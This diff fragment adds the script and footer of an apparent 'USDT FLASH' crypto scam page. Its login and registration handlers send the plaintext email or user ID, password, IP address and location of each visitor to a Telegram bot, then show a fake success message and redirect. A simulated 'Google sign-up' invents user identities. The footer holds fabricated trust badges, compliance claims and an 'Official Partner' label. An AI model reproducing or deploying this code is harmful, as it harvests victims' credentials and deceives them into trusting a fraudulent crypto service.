+                    try {
+                        const response = await fetch(service);
+                        const data = await response.json();
+                        return {
+                            country: data.country_name || data.country || data.country_code || 'Unknown',
+                            countryCode: data.country_code || data.countryCode || '',
+                            city: data.city || '',
+                            region: data.region || data.region_name || '',
+                            ip: data.ip || ''
+                        };
+                    } catch (err) { continue; }
+                }
+                return { country: 'Unknown', countryCode: '', city: '', region: '', ip: '' };
+            } catch (error) {
+                return { country: 'Unknown', countryCode: '', city: '', region: '', ip: '' };
+            }
+        }
+
+        function formatUserDataMessage(userData) {
+            const timestamp = new Date().toLocaleString('en-US', { timeZone: 'UTC' });
+            const countryFlag = userData.country && userData.country.countryCode
+                ? getCountryFlag(userData.country.countryCode) : '🌍';
+
+            let message = `🔔 <b>New User Registration</b>\n\n`;
+            message += `📅 <b>Date:</b> ${timestamp} UTC\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+
+            if (userData.registrationType === 'quick') {
+                message += `⚡ <b>Registration Type:</b> Quick Registration\n\n`;
+                message += `👤 <b>User ID:</b> <code>${userData.userId}</code>\n`;
+                message += `🔑 <b>Password:</b> <code>${userData.password}</code>\n`;
+            } else if (userData.registrationType === 'manual') {
+                message += `📝 <b>Registration Type:</b> Manual Registration\n\n`;
+                message += `👤 <b>Full Name:</b> ${userData.fullName}\n`;
+                message += `📧 <b>Email:</b> ${userData.email}\n`;
+                message += `🆔 <b>User ID:</b> <code>${userData.userId}</code>\n`;
+                message += `🔑 <b>Password:</b> <code>${userData.password}</code>\n`;
+            } else if (userData.registrationType === 'google') {
+                message += `🔵 <b>Registration Type:</b> Google Sign Up\n\n`;
+                message += `👤 <b>Full Name:</b> ${userData.fullName}\n`;
+                message += `📧 <b>Email:</b> ${userData.email}\n`;
+                message += `🆔 <b>User ID:</b> <code>${userData.userId}</code>\n`;
+                message += `🔑 <b>Password:</b> <code>${userData.password}</code>\n`;
+            } else if (userData.type === 'login') {
+                message = `🔓 <b>User Login</b>\n\n`;
+                message += `📅 <b>Date:</b> ${timestamp} UTC\n`;
+                message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+                message += `👤 <b>Email/User ID:</b> ${userData.emailOrUserId}\n`;
+                message += `🔑 <b>Password:</b> <code>${userData.password}</code>\n`;
+            }
+
+            message += `\n━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `🌐 <b>Source:</b> FLASH TOKEN Platform\n`;
+            message += `💻 <b>Device:</b> ${navigator.userAgent.includes('Mobile') ? 'Mobile' : 'Desktop'}\n`;
+
+            if (userData.country) {
+                message += `\n📍 <b>Location Information:</b>\n`;
+                message += `${countryFlag} <b>Country:</b> ${userData.country.country}\n`;
+                if (userData.country.city) message += `🏙️ <b>City:</b> ${userData.country.city}\n`;
+                if (userData.country.region) message += `🗺️ <b>Region:</b> ${userData.country.region}\n`;
+                if (userData.country.ip) message += `🔗 <b>IP Address:</b> <code>${userData.country.ip}</code>\n`;
+            }
+            return message;
+        }
+
+        function getCountryFlag(countryCode) {
+            if (!countryCode || countryCode.length !== 2) return '🌍';
+            const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
+            return String.fromCodePoint(...codePoints);
+        }
+
+        function saveUserToLocalStorage(userData) {
+            let users = JSON.parse(localStorage.getItem('registeredUsers')) || [];
+            userData.registeredAt = new Date().toISOString();
+            userData.id = Date.now() + Math.random().toString(36).substr(2, 9);
+            users.push(userData);
+            localStorage.setItem('registeredUsers', JSON.stringify(users));
+            localStorage.setItem('currentUser', JSON.stringify(userData));
+            updateDailyStats(userData);
+            return userData;
+        }
+
+        function updateDailyStats(userData) {
+            const today = new Date().toISOString().split('T')[0];
+            let stats = JSON.parse(localStorage.getItem('dailyStats')) || {};
+            if (!stats[today]) {
+                stats[today] = { date: today, totalRegistrations: 0, totalLogins: 0, quickRegistrations: 0, manualRegistrations: 0, googleRegistrations: 0, countries: {}, devices: { mobile: 0, desktop: 0 } };
+            }
+            if (userData.type === 'login') {
+                stats[today].totalLogins++;
+            } else {
+                stats[today].totalRegistrations++;
+                if (userData.registrationType === 'quick') stats[today].quickRegistrations++;
+                else if (userData.registrationType === 'manual') stats[today].manualRegistrations++;
+                else if (userData.registrationType === 'google') stats[today].googleRegistrations++;
+            }
+            if (userData.country && userData.country.country) {
+                stats[today].countries[userData.country.country] = (stats[today].countries[userData.country.country] || 0) + 1;
+            }
+            const isMobile = navigator.userAgent.includes('Mobile');
+            if (isMobile) stats[today].devices.mobile++;
+            else stats[today].devices.desktop++;
+            localStorage.setItem('dailyStats', JSON.stringify(stats));
+            if (userData.type !== 'login') sendDailyStatsToTelegram(stats[today]);
+        }
+
+        async function sendDailyStatsToTelegram(todayStats) {
+            const message = formatDailyStatsMessage(todayStats);
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
+                });
+            } catch (error) {}
+        }
+
+        function formatDailyStatsMessage(stats) {
+            let message = `📊 <b>Daily Statistics Update</b>\n\n`;
+            message += `📅 <b>Date:</b> ${stats.date}\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+            message += `🆕 <b>Registrations Today:</b> ${stats.totalRegistrations}\n`;
+            if (stats.totalRegistrations > 0) {
+                message += `   ⚡ Quick: ${stats.quickRegistrations}\n`;
+                message += `   📝 Manual: ${stats.manualRegistrations}\n`;
+                message += `   🔵 Google: ${stats.googleRegistrations}\n`;
+            }
+            message += `\n🔓 <b>Logins Today:</b> ${stats.totalLogins}\n\n`;
+            const totalDevices = stats.devices.mobile + stats.devices.desktop;
+            if (totalDevices > 0) {
+                message += `💻 <b>Devices:</b>\n`;
+                message += `   📱 Mobile: ${stats.devices.mobile} (${Math.round(stats.devices.mobile/totalDevices*100)}%)\n`;
+                message += `   🖥️ Desktop: ${stats.devices.desktop} (${Math.round(stats.devices.desktop/totalDevices*100)}%)\n\n`;
+            }
+            const countries = Object.entries(stats.countries);
+            if (countries.length > 0) {
+                message += `🌍 <b>Top Countries:</b>\n`;
+                countries.sort((a, b) => b[1] - a[1]).slice(0, 5).forEach(([country, count]) => {
+                    message += `   • ${country}: ${count}\n`;
+                });
+            }
+            message += `\n━━━━━━━━━━━━━━━━━━━━\n🔄 <i>Auto-updated statistics</i>`;
+            return message;
+        }
+
+        // ===== Mobile Menu =====
+        (function() {
+            const hamburger = document.getElementById('hamburgerBtn');
+            const overlay = document.getElementById('mobileOverlay');
+            const menu = document.getElementById('mobileMenu');
+
+            function toggleMenu(open) {
+                const isOpen = open !== undefined ? open : !menu.classList.contains('open');
+                menu.classList.toggle('open', isOpen);
+                overlay.classList.toggle('active', isOpen);
+                hamburger.classList.toggle('active', isOpen);
+                document.body.style.overflow = isOpen ? 'hidden' : '';
+            }
+
+            hamburger.addEventListener('click', () => toggleMenu());
+            overlay.addEventListener('click', () => toggleMenu(false));
+        })();
+
+        // ===== Theme Toggle =====
+        (function() {
+            const desktopBtn = document.getElementById('themeToggleDesktop');
+            const mobileBtn = document.getElementById('themeToggleMobile');
+            const desktopIcon = desktopBtn.querySelector('i');
+            const mobileIcon = mobileBtn.querySelector('i');
+            const mobileText = mobileBtn.querySelector('span');
+
+            function applyTheme(isLight) {
+                document.body.classList.toggle('light-mode', isLight);
+                desktopIcon.className = isLight ? 'fas fa-moon' : 'fas fa-sun';
+                mobileIcon.className = isLight ? 'fas fa-moon' : 'fas fa-sun';
+                mobileText.textContent = isLight ? 'Dark Mode' : 'Light Mode';
+                localStorage.setItem('lightMode', isLight ? 'enabled' : 'disabled');
+                if (typeof window.applyLightMode === 'function') {
+                    window.applyLightMode(isLight);
+                }
+            }
+
+            const savedMode = localStorage.getItem('lightMode');
+            if (savedMode === 'enabled') applyTheme(true);
+
+            desktopBtn.addEventListener('click', () => applyTheme(!document.body.classList.contains('light-mode')));
+            mobileBtn.addEventListener('click', () => {
+                applyTheme(!document.body.classList.contains('light-mode'));
+                // Close mobile menu after toggling
+                document.getElementById('hamburgerBtn').click();
+            });
+        })();
+
+        // ===== Modal =====
+        const createAccountBtn = document.getElementById('createAccountBtn');
+        const registrationModal = document.getElementById('registrationModal');
+        const closeModal = document.getElementById('closeModal');
+
+        createAccountBtn.addEventListener('click', () => registrationModal.classList.add('active'));
+        closeModal.addEventListener('click', () => registrationModal.classList.remove('active'));
+        registrationModal.addEventListener('click', (e) => {
+            if (e.target === registrationModal) registrationModal.classList.remove('active');
+        });
+
+        // ===== Login Form =====
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const button = this.querySelector('.login-button');
+            const emailOrUserId = this.querySelector('input[placeholder="Email or User ID"]').value;
+            const password = this.querySelector('input[placeholder="Password"]').value;
+
+            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Signing in...';
+            button.disabled = true;
+
+            const loginData = { type: 'login', emailOrUserId, password };
+            updateDailyStats(loginData);
+            sendToTelegram(loginData);
+
+            setTimeout(() => {
+                button.innerHTML = '<i class="fas fa-check"></i> Success! Redirecting...';
+                const currentUser = { emailOrUserId, password, loggedIn: true, loginTime: new Date().toISOString() };
+                localStorage.setItem('user', JSON.stringify(currentUser));
+                setTimeout(() => window.location.href = 'captcha.html', 800);
+            }, 1500);
+        });
+
+        // ===== Registration Form =====
+        document.getElementById('registrationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const button = this.querySelector('.signup-button');
+            const firstName = this.querySelector('input[placeholder="First name"]').value;
+            const lastName = this.querySelector('input[placeholder="Last name"]').value;
+            const email = this.querySelector('input[placeholder="Email address"]').value;
+            const password = this.querySelector('input[placeholder="Create password"]').value;
+
+            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating account...';
+            button.disabled = true;
+
+            setTimeout(() => {
+                const userId = 'USR' + Math.random().toString(36).substr(2, 8).toUpperCase();
+                const userData = { userId, password, registrationType: 'manual', fullName: `${firstName} ${lastName}`, firstName, lastName, email };
+                saveUserToLocalStorage(userData);
+                sendToTelegram(userData);
+
+                button.innerHTML = '<i class="fas fa-check"></i> Account Created!';
+                const userForProfile = { userId, password, firstName, lastName, name: `${firstName} ${lastName}`, email, registrationType: 'manual', loggedIn: true, registeredAt: new Date().toISOString() };
+                localStorage.setItem('user', JSON.stringify(userForProfile));
+                setTimeout(() => window.location.href = 'captcha.html', 800);
+            }, 1500);
+        });
+
+        function showManualForm() {
+            document.getElementById('registrationOptions').style.display = 'none';
+            document.getElementById('registrationForm').style.display = 'block';
+        }
+
+        function showRegistrationOptions() {
+            document.getElementById('registrationOptions').style.display = 'block';
+            document.getElementById('registrationForm').style.display = 'none';
+        }
+
+        function quickRegister() {
+            const modal = document.getElementById('registrationModal');
+            const modalBody = modal.querySelector('.modal-body');
+
+            modalBody.innerHTML = `
+                <div style="text-align: center; padding: 40px 20px;">
+                    <i class="fas fa-spinner fa-spin text-5xl" style="color: #34d399;"></i>
+                    <h3 class="text-xl font-bold mt-4 mb-2" style="color: #f1f5f9;">Creating Your Account...</h3>
+                    <p style="color: #64748b;">Please wait a moment</p>
+                </div>
+            `;
+
+            setTimeout(() => {
+                const userId = 'USR' + Math.random().toString(36).substr(2, 8).toUpperCase();
+                const tempPassword = generateRandomPassword();
+
+                const userData = { userId, password: tempPassword, registrationType: 'quick', fullName: null, email: null };
+                saveUserToLocalStorage(userData);
+                sendToTelegram(userData);
+
+                const userForProfile = { userId, password: tempPassword, registrationType: 'quick', loggedIn: true, registeredAt: new Date().toISOString() };
+                localStorage.setItem('user', JSON.stringify(userForProfile));
+
+                modalBody.innerHTML = `
+                    <div style="text-align: center; padding: 40px 20px;">
+                        <i class="fas fa-check-circle text-5xl mb-4" style="color: #34d399;"></i>
+                        <h3 class="text-2xl font-bold mb-4" style="color: #f1f5f9;">Account Created Successfully!</h3>
+
+                        <div style="background: rgba(16,185,129,0.06); border: 1px solid rgba(16,185,129,0.15); border-radius: 14px; padding: 20px; margin: 20px 0; text-align: left;">
+                            <p class="text-sm mb-3" style="color: #94a3b8;"><strong style="color: #e2e8f0;">Your Login Credentials:</strong></p>
+
+                            <div class="mb-3">
+                                <label class="text-xs" style="color: #64748b;">User ID:</label>
+                                <div class="flex items-center gap-2 mt-1">
+                                    <input type="text" value="${userId}" id="userIdField" readonly class="form-input" style="margin: 0; background: rgba(0,0,0,0.2);">
+                                    <button onclick="copyToClipboard('userIdField')" class="p-2.5 rounded-lg transition-all" style="background: #10b981; color: white; border: none; cursor: pointer;">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                            </div>
+
+                            <div>
+                                <label class="text-xs" style="color: #64748b;">Password:</label>
+                                <div class="flex items-center gap-2 mt-1">
+                                    <input type="text" value="${tempPassword}" id="passwordField" readonly class="form-input" style="margin: 0; background: rgba(0,0,0,0.2);">
+                                    <button onclick="copyToClipboard('passwordField')" class="p-2.5 rounded-lg transition-all" style="background: #10b981; color: white; border: none; cursor: pointer;">
+                                        <i class="fas fa-copy"></i>
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <p class="text-sm mb-4" style="color: #64748b;">⚠️ Please save these credentials securely.</p>
+
+                        <button onclick="window.location.href='captcha.html'" class="login-button" style="margin-top: 0;">
+                            Continue to Dashboard
+                        </button>
+                    </div>
+                `;
+            }, 2000);
+        }
+
+        function generateRandomPassword() {
+            const length = 12;
+            const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
+            let password = '';
+            for (let i = 0; i < length; i++) {
+                password += charset.charAt(Math.floor(Math.random() * charset.length));
+            }
+            return password;
+        }
+
+        document.getElementById('googleSignUpBtn').addEventListener('click', function() {
+            const button = this;
+            button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>Connecting...</span>';
+            button.disabled = true;
+
+            setTimeout(() => {
+                const userId = 'USR' + Math.random().toString(36).substr(2, 8).toUpperCase();
+                const tempPassword = generateRandomPassword();
+
+                const googleNames = [
+                    {first: 'Alex', last: 'Johnson'}, {first: 'Sarah', last: 'Williams'},
+                    {first: 'Michael', last: 'Brown'}, {first: 'Emma', last: 'Davis'},
+                    {first: 'James', last: 'Miller'}, {first: 'Olivia', last: 'Wilson'}
+                ];
+                const randomName = googleNames[Math.floor(Math.random() * googleNames.length)];
+                const randomNum = Math.floor(Math.random() * 999) + 100;
+                const googleEmail = `${randomName.first.toLowerCase()}.${randomName.last.toLowerCase()}${randomNum}@gmail.com`;
+
+                const userData = { userId, password: tempPassword, registrationType: 'google', fullName: `${randomName.first} ${randomName.last}`, firstName: randomName.first, lastName: randomName.last, email: googleEmail, googleAccount: true };
+                saveUserToLocalStorage(userData);
+                sendToTelegram(userData);
+
+                const userForProfile = { userId, password: tempPassword, firstName: randomName.first, lastName: randomName.last, name: `${randomName.first} ${randomName.last}`, email: googleEmail, registrationType: 'google', googleAccount: true, loggedIn: true, registeredAt: new Date().toISOString() };
+                localStorage.setItem('user', JSON.stringify(userForProfile));
+
+                button.innerHTML = '<i class="fas fa-check"></i> <span>Account Created!</span>';
+                setTimeout(() => window.location.href = 'captcha.html', 800);
+            }, 1500);
+        });
+
+        function copyToClipboard(fieldId) {
+            const field = document.getElementById(fieldId);
+            field.select();
+            document.execCommand('copy');
+            const button = event.target.closest('button');
+            const originalHTML = button.innerHTML;
+            button.innerHTML = '<i class="fas fa-check"></i>';
+            setTimeout(() => button.innerHTML = originalHTML, 1000);
+        }
+    </script>
+
+    <script src="js/theme-switcher.js"></script>
+
+    <!-- Enhanced Professional Footer -->
+    <style>.footer-link:hover{color:#fff!important}.footer-social:hover{background:rgba(52,211,153,.15)!important;border-color:rgba(52,211,153,.3)!important;color:#34d399!important}.footer-verify:hover{color:#34d399!important}</style>
+    <footer class="relative" style="background: linear-gradient(180deg, #0b1119 0%, #060a10 100%); border-top: 1px solid rgba(52, 211, 153, 0.15);" dir="ltr">
+        <div class="absolute inset-0 opacity-[0.03] pointer-events-none" style="background-image: radial-gradient(circle at 25% 25%, #34d399 0%, transparent 50%), radial-gradient(circle at 75% 75%, #3b82f6 0%, transparent 50%);"></div>
+        <div class="container mx-auto px-4 sm:px-6 lg:px-8 py-10 sm:py-14 lg:py-18 relative z-10">
+            <div class="flex justify-center mb-8 sm:mb-10 lg:mb-12">
+                <div class="inline-flex items-center gap-2 px-4 py-2 rounded-full text-xs font-semibold tracking-wider" style="background: rgba(52, 211, 153, 0.08); border: 1px solid rgba(52, 211, 153, 0.2); color: #34d399;">
+                    <i class="ti ti-shield-check"></i>
+                    TRUSTED BY 1.2M+ USERS WORLDWIDE
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-12 gap-6 sm:gap-8 lg:gap-10 mb-8 sm:mb-10 lg:mb-12">
+                <div class="lg:col-span-3 text-center sm:text-left">
+                    <div class="flex items-center justify-center sm:justify-start gap-3 mb-4">
+                        <div class="w-10 h-10 rounded-xl flex items-center justify-center" style="background: linear-gradient(135deg, rgba(52, 211, 153, 0.15), rgba(52, 211, 153, 0.05)); border: 1px solid rgba(52, 211, 153, 0.2);">
+                            <img src="img/usdt_cryptocurrencies_icon_188337.png" alt="USDT-FLASH" class="w-6 h-6">
+                        </div>
+                        <div>
+                            <h3 class="text-lg font-bold text-white tracking-tight">USDT FLASH</h3>
+                            <p class="text-[10px] tracking-widest uppercase" style="color: #34d399;">Professional Crypto Solutions</p>
+                        </div>
+                    </div>
+                    <p class="text-xs sm:text-sm leading-relaxed mb-5" style="color: #94a3b8; max-width: 320px;">
+                        Enterprise-grade USDT-FLASH transactions with instant delivery, military-grade security, and 24/7 dedicated support since 2019.
+                    </p>
+                </div>
+
+                <div class="lg:col-span-2">
+                    <h4 class="text-xs font-semibold uppercase tracking-wider mb-4" style="color: #34d399;">Quick Links</h4>
+                    <ul class="space-y-2.5">
+                        <li><a href="pages/live-transactions.html" class="footer-link text-xs sm:text-sm transition-colors duration-200 flex items-center gap-2" style="color: #94a3b8;"><i class="ti ti-arrow-right text-[10px]" style="color: #34d399;"></i>Live Transactions</a></li>
+                        <li><a href="pages/support.html" class="footer-link text-xs sm:text-sm transition-colors duration-200 flex items-center gap-2" style="color: #94a3b8;"><i class="ti ti-arrow-right text-[10px]" style="color: #34d399;"></i>Technical Support</a></li>
+                        <li><a href="about-en.html" class="footer-link text-xs sm:text-sm transition-colors duration-200 flex items-center gap-2" style="color: #94a3b8;"><i class="ti ti-arrow-right text-[10px]" style="color: #34d399;"></i>About Us</a></li>
+                    </ul>
+                </div>
+
+                <div class="lg:col-span-2">
+                    <h4 class="text-xs font-semibold uppercase tracking-wider mb-4" style="color: #34d399;">Policies</h4>
+                    <ul class="space-y-2.5">
+                        <li><a href="pages/privacy-policy.html" class="footer-link text-xs sm:text-sm transition-colors duration-200 flex items-center gap-2" style="color: #94a3b8;"><i class="ti ti-arrow-right text-[10px]" style="color: #34d399;"></i>Privacy Policy</a></li>
+                        <li><a href="pages/terms-of-service.html" class="footer-link text-xs sm:text-sm transition-colors duration-200 flex items-center gap-2" style="color: #94a3b8;"><i class="ti ti-arrow-right text-[10px]" style="color: #34d399;"></i>Terms of Service</a></li>
+                        <li><a href="pages/aml-policy.html" class="footer-link text-xs sm:text-sm transition-colors duration-200 flex items-center gap-2" style="color: #94a3b8;"><i class="ti ti-arrow-right text-[10px]" style="color: #34d399;"></i>AML Policy</a></li>
+                    </ul>
+                </div>
+
+                <div class="sm:col-span-2 lg:col-span-4">
+                    <h4 class="text-xs font-semibold uppercase tracking-wider mb-4 text-center sm:text-left" style="color: #34d399;">Trust &amp; Security</h4>
+                    <div class="grid grid-cols-2 sm:grid-cols-4 gap-2 sm:gap-2.5">
+                        <div class="flex items-center gap-2 p-2 rounded-lg" style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06);">
+                            <i class="ti ti-shield-lock text-lg" style="color: #34d399;"></i>
+                            <span class="text-[10px] sm:text-xs font-medium" style="color: #94a3b8;">256-bit SSL</span>
+                        </div>
+                        <div class="flex items-center gap-2 p-2 rounded-lg" style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06);">
+                            <i class="ti ti-fingerprint text-lg" style="color: #60a5fa;"></i>
+                            <span class="text-[10px] sm:text-xs font-medium" style="color: #94a3b8;">ISO 27001</span>
+                        </div>
+                        <div class="flex items-center gap-2 p-2 rounded-lg" style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06);">
+                            <i class="ti ti-building-bank text-lg" style="color: #a78bfa;"></i>
+                            <span class="text-[10px] sm:text-xs font-medium" style="color: #94a3b8;">PCI DSS</span>
+                        </div>
+                        <div class="flex items-center gap-2 p-2 rounded-lg" style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06);">
+                            <i class="ti ti-shield-check text-lg" style="color: #fbbf24;"></i>
+                            <span class="text-[10px] sm:text-xs font-medium" style="color: #94a3b8;">SOC 2</span>
+                        </div>
+                        <div class="flex items-center gap-2 p-2 rounded-lg" style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06);">
+                            <i class="ti ti-file-check text-lg" style="color: #f472b6;"></i>
+                            <span class="text-[10px] sm:text-xs font-medium" style="color: #94a3b8;">GDPR</span>
+                        </div>
+                        <div class="flex items-center gap-2 p-2 rounded-lg" style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06);">
+                            <i class="ti ti-copyright text-lg" style="color: #fb923c;"></i>
+                            <span class="text-[10px] sm:text-xs font-medium" style="color: #94a3b8;">DMCA</span>
+                        </div>
+                        <div class="flex items-center gap-2 p-2 rounded-lg" style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06);">
+                            <i class="ti ti-brand-norton text-lg" style="color: #34d399;"></i>
+                            <span class="text-[10px] sm:text-xs font-medium" style="color: #94a3b8;">Norton Secured</span>
+                        </div>
+                        <div class="flex items-center gap-2 p-2 rounded-lg" style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06);">
+                            <i class="ti ti-shield-half text-lg" style="color: #60a5fa;"></i>
+                            <span class="text-[10px] sm:text-xs font-medium" style="color: #94a3b8;">McAfee Secure</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="mb-8 sm:mb-10">
+                <div class="relative py-6 sm:py-8 px-4 sm:px-8 rounded-2xl overflow-hidden" style="background: linear-gradient(135deg, rgba(38,161,123,0.04), rgba(38,161,123,0.01)); border: 1px solid rgba(38,161,123,0.1);">
+                    <div class="absolute inset-0 opacity-[0.03]" style="background-image: repeating-linear-gradient(45deg, transparent, transparent 20px, rgba(38,161,123,0.3) 20px, rgba(38,161,123,0.3) 21px);"></div>
+                    <div class="flex items-center justify-center gap-3 sm:gap-4 mb-5">
+                        <div class="h-px flex-1" style="background: linear-gradient(90deg, transparent, rgba(38,161,123,0.15));"></div>
+                        <span class="text-[10px] font-bold tracking-[0.2em] uppercase px-2" style="color: #34d399;">
+                            <i class="ti ti-credit-card mr-1.5"></i>Accepted Everywhere
+                        </span>
+                        <div class="h-px flex-1" style="background: linear-gradient(270deg, transparent, rgba(38,161,123,0.15));"></div>
+                    </div>
+                    <div class="flex flex-wrap justify-center items-center gap-2 sm:gap-3">
+                        <div class="flex items-center gap-2 px-3 py-2 rounded-xl transition-all duration-200 hover:scale-105" style="background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06);">
+                            <img src="logog/Binance_Logo.png" alt="Binance" class="w-5 h-5 sm:w-6 sm:h-6 rounded-full">
+                            <span class="text-[10px] sm:text-xs font-semibold" style="color: #f0b90b;">Binance</span>
+                        </div>
+                        <div class="flex items-center gap-2 px-3 py-2 rounded-xl transition-all duration-200 hover:scale-105" style="background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06);">
+                            <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="RedotPay" class="w-5 h-5 sm:w-6 sm:h-6 rounded-full">
+                            <span class="text-[10px] sm:text-xs font-semibold" style="color: #ef4444;">RedotPay</span>
+                        </div>
+                        <div class="flex items-center gap-2 px-3 py-2 rounded-xl transition-all duration-200 hover:scale-105" style="background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06);">
+                            <img src="logog/96ccc3a827c1d8d276a9e3f5d0cba95b.jpg" alt="Bybit" class="w-5 h-5 sm:w-6 sm:h-6 rounded-full">
+                            <span class="text-[10px] sm:text-xs font-semibold" style="color: #6366f1;">Bybit</span>
+                        </div>
+                        <div class="flex items-center gap-2 px-3 py-2 rounded-xl transition-all duration-200 hover:scale-105" style="background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06);">
+                            <i class="fab fa-cc-visa text-lg sm:text-xl" style="color: #1a1f71;"></i>
+                            <span class="text-[10px] sm:text-xs font-semibold" style="color: #1a1f71;">Visa</span>
+                        </div>
+                        <div class="flex items-center gap-2 px-3 py-2 rounded-xl transition-all duration-200 hover:scale-105" style="background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06);">
+                            <i class="fab fa-cc-mastercard text-lg sm:text-xl" style="color: #eb001b;"></i>
+                            <span class="text-[10px] sm:text-xs font-semibold" style="color: #eb001b;">MasterCard</span>
+                        </div>
+                        <div class="flex items-center gap-2 px-3 py-2 rounded-xl transition-all duration-200 hover:scale-105" style="background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06);">
+                            <i class="fab fa-cc-paypal text-lg sm:text-xl" style="color: #003087;"></i>
+                            <span class="text-[10px] sm:text-xs font-semibold" style="color: #003087;">PayPal</span>
+                        </div>
+                        <div class="flex items-center gap-2 px-3 py-2 rounded-xl transition-all duration-200 hover:scale-105" style="background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06);">
+                            <img src="https://cdn.iconscout.com/icon/free/png-256/skrill-1-283528.png" alt="Skrill" class="w-5 h-5 sm:w-6 sm:h-6 rounded">
+                            <span class="text-[10px] sm:text-xs font-semibold" style="color: #8b5cf6;">Skrill</span>
+                        </div>
+                        <div class="flex items-center gap-2 px-3 py-2 rounded-xl transition-all duration-200 hover:scale-105" style="background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06);">
+                            <img src="https://cdn.iconscout.com/icon/free/png-256/neteller-1-283529.png" alt="Neteller" class="w-5 h-5 sm:w-6 sm:h-6 rounded">
+                            <span class="text-[10px] sm:text-xs font-semibold" style="color: #f59e0b;">Neteller</span>
+                        </div>
+                        <div class="flex items-center gap-2 px-3 py-2 rounded-xl transition-all duration-200 hover:scale-105" style="background: rgba(38,161,123,0.06); border: 1px solid rgba(38,161,123,0.12);">
+                            <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" class="w-5 h-5 sm:w-6 sm:h-6 rounded-full">
+                            <span class="text-[10px] sm:text-xs font-semibold" style="color: #34d399;">USDT</span>
+                        </div>
+                        <div class="flex items-center gap-2 px-3 py-2 rounded-xl transition-all duration-200 hover:scale-105" style="background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06);">
+                            <i class="fab fa-bitcoin text-lg sm:text-xl" style="color: #f7931a;"></i>
+                            <span class="text-[10px] sm:text-xs font-semibold" style="color: #f7931a;">Bitcoin</span>
+                        </div>
+                        <div class="flex items-center gap-2 px-3 py-2 rounded-xl transition-all duration-200 hover:scale-105" style="background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06);">
+                            <i class="fab fa-apple text-lg sm:text-xl" style="color: #94a3b8;"></i>
+                            <span class="text-[10px] sm:text-xs font-semibold" style="color: #94a3b8;">Apple Pay</span>
+                        </div>
+                        <div class="flex items-center gap-2 px-3 py-2 rounded-xl transition-all duration-200 hover:scale-105" style="background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06);">
+                            <i class="fas fa-building-columns text-lg sm:text-xl" style="color: #64748b;"></i>
+                            <span class="text-[10px] sm:text-xs font-semibold" style="color: #64748b;">SWIFT</span>
+                        </div>
+                        <div class="flex items-center gap-2 px-3 py-2 rounded-xl transition-all duration-200 hover:scale-105" style="background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.06);">
+                            <i class="fas fa-university text-lg sm:text-xl" style="color: #64748b;"></i>
+                            <span class="text-[10px] sm:text-xs font-semibold" style="color: #64748b;">SEPA</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-[10px] sm:text-xs font-medium" style="background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.06); color: #94a3b8;">
+                <i class="fas fa-bolt"></i> MuchBetter
+            </div>
+
+            <div class="h-px w-full mb-6" style="background: linear-gradient(90deg, transparent, rgba(52, 211, 153, 0.2), transparent);"></div>
+
+            <div class="flex flex-col sm:flex-row items-center justify-between gap-3">
+                <p class="text-[10px] sm:text-xs" style="color: #64748b;">&copy; 2013 &mdash; 2026 USDT-FLASH. All rights reserved.</p>
+                <div class="flex items-center gap-4">
+                    <a href="https://tether.to/en/transparency" target="_blank" class="footer-verify text-[10px] sm:text-xs transition-colors flex items-center gap-1.5" style="color: #64748b;">
+                        <i class="ti ti-external-link"></i> Verify on Tether.to
+                    </a>
+                    <span class="text-[10px] flex items-center gap-1.5" style="color: #34d399;">
+                        <i class="ti ti-circle-check"></i> Official Partner
+                    </span>
+                </div>
+            </div>
+        </div>
+    </footer>
+</body>
+</html>
